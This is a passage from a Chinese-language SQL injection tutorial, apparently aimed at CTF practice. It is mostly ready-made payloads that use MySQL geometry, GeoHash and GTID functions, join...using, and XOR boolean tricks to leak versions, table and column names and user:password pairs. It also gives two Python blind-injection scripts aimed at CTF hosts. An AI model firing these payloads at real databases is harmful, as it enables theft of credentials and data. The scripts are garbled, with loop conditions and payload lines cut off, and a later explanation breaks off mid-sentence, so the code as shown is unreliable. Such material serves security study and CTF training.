###### 0x04 geometrycollection() mysql 版本5.5
（1）函数解释：  
GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。  
（2）官方文档中举例的用法如下：  
GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))  
（3）报错原因：  
因为MYSQL无法使用这样的字符串画出图形，所以报错
    1') and geometrycollection((select * from(select * from(select version())a)b)); %23
    1') and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name='manage' limit 0,1)a)b)); %23
    1') and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage limit 0,1)a)b)); %23
这里和我们上面学过的cancat和上一关学的内置表有两个梦幻联动
###### 0x05 multipoint() mysql 版本5.5
（1）函数解释：  
MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。  
（2）报错原因：  
同样是因为无法使用字符串画出图形与geometrycollection类似
    1') and multipoint((select * from(select * from(select version())a)b)); %23
###### 0x06 polygon()
polygon来自希腊。 “Poly” 意味 “many” ， “gon” 意味 “angle”.  
Polygon是代表多边几何对象的平面Surface。它由单个外部边界以及0或多个内部边界定义，其中，每个内部边界定义为Polygon中的1个孔。
    ') or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,':',password) from manage))asd)asd))--+
###### 0x07 mutipolygon()
    ') or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,':',password) from manage))asd)asd))
###### 0x08 linestring(）
报错原理：  
mysql的有些几何函数（
例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()
）对参数要求为几何数据，若不满足要求则会报错，适用于5.1-5.5版本 (5.0.中存在但是不会报错)  
    1') and linestring((select * from(select * from(select database())a)b))--+;
###### 0x09 multilinestring()
同上
###### 0x0a ST.LatFromGeoHash()（mysql>=5.7.x）
    ') or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e))))a)b))--+
###### 0x0b ST.LongFromGeoHash
同上 嵌套查询
###### 0x0c ST_Pointfromgeohash (mysql>5.7)
    #获取数据库版本信息
    ')or  ST_PointFromGeoHash(version(),1)--+
    ')or  ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+
    ')or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = 'manage' limit 0,1),1)--+
    ')or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,':',`password`) from manage),0x23)),1)--+
###### 0x0d GTID (MySQL >= 5.6.X - 显错 GTID的表现形式 -> GTID
> =source_id:transaction_id其中source_id一般为数据库的uuid，transaction_id为事务ID，从1开始3E11FA47-71CA-11E1-9E33-C80AA9429562:23如上面的GTID可以看出该事务为UUID为3E11FA47-71CA-11E1-9E33-C80AA9429562的数据库的23号事务
**GTID集合** (一组全局事务标识符)：  
GTID集合为多个单GTID和一个范围内GTID的集合，他主要用于如下地方
  * gtid_executed 系统变量
  * gtid_purged系统变量
  * GTID_SUBSET() 和 GTID_SUBTRACT()函数
格式如下：
    3E11FA47-71CA-11E1-9E33-C80AA9429562:1-5
**0X02 函数详解**
GTID_SUBSET() 和 GTID_SUBTRACT() 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错
  1. GTID_SUBSET( set1 , set2 ) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)
  2. GTID_SUBTRACT( set1 , set2 ) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)  
正常情况如下
>
> GTID_SUBSET(‘3E11FA47-71CA-11E1-9E33-C80AA9429562:23’,‘3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57’)GTID_SUBTRACT(‘3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57’,‘3E11FA47-71CA-11E1-9E33-C80AA9429562:20-25’)  
>
**0x03 注入过程( payload )**
**GTID_SUBSET函数**
    ') or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+
**GTID_SUBTRACT**
    ') or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)--+
上面是一些常见或者不常见的能够报错注入的函数，报错注入就是利用这些函数，在我们的查询语句中的这些函数内的某个位置再嵌套一个子查询，利用产生的报错将子查询的结果回显出来，每个报错注入的函数都搭配了网上找到的简单的payload，情况总是在变化，注意一下函数中子查询所在的位置即可。
###### 使用不存在的函数来报错
随便使用一个不存在的函数，可能会得到当前所在的数据库名称。
###### 使用 join using() 报错获取列名
  * 一般应用于 **无列名注入** ，下文绕过中会细讲。
>
> 通过关键字join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因（相同列名存在），而发生错误。并且报错信息会存在重复的列名，可以使用
> USING 表达式声明内连接（INNER JOIN）条件来避免报错。
下面演示如何通过join...using来获取列名：
    # 获取第一列的列名:
    1' union select * from (select * from users as a join users as b)as c#
    # 使用using()依次获取后续的列名
    1' union all select * from (select * from users as a join users b using(id))c#
    1' union all select * from (select * from users as a join users b using(id,username))c#
    1' union all select * from (select * from users as a join users b using(id,username,password))c#
    # 数据库中as主要作用是起别名, 常规来说as都可以省略，但是为了增加可读性, 不建议省略
##### 注入流程
大体的注入流程就是在联合查询不成功的情况下尝试使用报错注入的函数得到回显子查询结果的报错结果。
#### 布尔盲注
SQL
Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取sql语句的执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。
对于基于布尔的盲注，可通过构造真or假判断条件（数据库各项信息取值的大小比较，
如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码...），
将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果
（True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从TrueFalse发生变化的转折点。
##### 用到的SQL语法知识
会用到截取字符的函数：`substr()`
可以直接判断字符或者根据ASCII码来判断，利用ASCII码时要用到`ASCII()`函数来将字符转换为ASCII码值。
还用到了各种运算符，``，`=`当然不必多提，但是在下面POST的方式中用到了异或符号`^`，这里其实是一种异或注入的方法，当我们在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入。
> 异或运算规则:  
>  `1^1=0 0^0=0 0^1=1`  
>  `1^1^1=0 1^1^0=0`  
>  构造payload:`'^ascii(mid(database(),1,1)=98)^0`
注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.
##### 注入流程
首先通过页面对于永真条件`or 1=1` 与永假条件 `and 1=2` 的返回内容是否存在差异进行判断是否可以进行布尔盲注。
下面给出常用的布尔盲注脚本。
  * **GET 型注入：**
        import requests
    import time
    url = 'http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/'
    cookies = {       # 如果目标网站要事先登录，就加上cookies吧
        "PHPSESSID":"c8ab8r49nd2kk0qfhs0dcaktl3"
    }
    flag = ''
    for i in range(1,90000):
       low = 32
       high = 128
       mid = (low+high)//2
       while(low%d-- " %(i,mid)    # 注意get型的注入注释符要用--空格
           res = requests.get(url=payload)
           if 'You are in' in res.text:      # 为真时，即判断正确的时候的条件
               low = mid+1
           else:
               high = mid
           mid = (low+high)//2
       if(mid ==32 or mid ==127):
           break
       flag = flag+chr(mid)
       print(flag)
  * **POST 型注入：**
        import requests
    url = 'http://81689af7-4cd5-432c-a88e-f5113e16c7c1.node3.buuoj.cn/index.php'
    flag = ''
    for i in range(1,250):
       low = 32
       high = 128
       mid = (low+high)//2
       while(low%d)#" %(i,mid)
           datas = {
                         "id":payload
                    }
           res = requests.post(url=url,data=datas)
           if 'girlfriend' in res.text:      # 为真时，即判断正确的时候的条件
               low = mid+1
           else:
               high = mid
           mid = (low+high)//2
       if(mid ==32 or mid ==127):
           break
       flag = flag+chr(mid)
       print(flag)
不能当脚本小子，我们要掌握脚本的编写思路！！！
首先，我们先分析脚本的思路，脚本利用了request库来发送请求，同时定义了一个flag字符串用来储存flag。然后写了一个for循环，封顶跑250遍，然后定义了low和high，这里根据的是ASCII码中的打印字符，定义了中间值，因为一会儿要使用的是二分法，当low1)--+
    ?id=0'^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),{0},1))={1})--+
###### 利用order by的
  * **该方法只适用于表里就一行数据的时候。**
如果注入的时候没有报错，我们又不知道列名，就只能用 order by 盲注了。当然，在 **过滤了括号** 的时候，order by 盲注也是个很好的办法。
order by 的主要作用就是让查询出来的数据根据第n列进行排序（默认升序），我们可以使用order by排序比较字符的 ascii
码大小，从第⼀位开始比较，第⼀位相同时比较下⼀位。
利用方式参见如下测试：
    mysql> select * from admin where username='' or 1 union select 1,2,'5' order by 3;
    +----+----------+----------------------------------+
    | id | username | password                         |
    +----+----------+----------------------------------+